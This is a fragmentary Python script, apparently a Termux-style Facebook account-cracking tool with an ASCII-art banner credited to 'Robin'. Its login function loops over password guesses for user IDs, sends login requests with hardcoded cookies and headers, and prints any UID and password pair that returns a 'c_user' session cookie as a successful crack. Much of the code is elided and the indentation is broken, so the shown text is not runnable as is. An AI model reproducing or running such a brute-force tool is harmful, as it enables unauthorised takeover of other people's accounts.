...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Robin/1.2.0 OPN-B'
...
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |
$$ |  $$ |\$$$$$$  |$$$$$$$  |$$ |$$ |  $$ |
\__|  \__| \______/ \_______/ \__|\__|  \__|___/ /_/ |_/   
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mRobin \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mRobin \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://https://www.facebook.com/molla.robin.71')
       main()  
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            import requests
     cookies = {
    'datr': 'BIYJZWCiWysIaMwvGtPKbwUj',
    'sb': 'BIYJZY3RCBIvqZbYuLsqDhQD',
    'm_pixel_ratio': '2.1615686416625977',
    'wd': '333x636',
    'fr': '0fllXAIMG6p6PTafY..BlCYYE.Is.AAA.0.0.BlCYY7.AWWY1rWH09o',}
    headers = {
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Robin_OK.mp3")
                print('\033[1;92m[Robin-OK] '+uid+' | '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mRobin","\x1b[1;92mRitu","\x1b[1;93mRobin","\x1b[1;94mRobin","\x1b[1;95mRobin","\x1b[1;96mRobin","\x1b[1;97mRobin","\x1b[1;91mRobin","\x1b[1;92mRobin","\x1b[1;93mRobin","\x1b[1;94mRobin","\x1b[1;95mRobin","\x1b[1;96mRitu"])
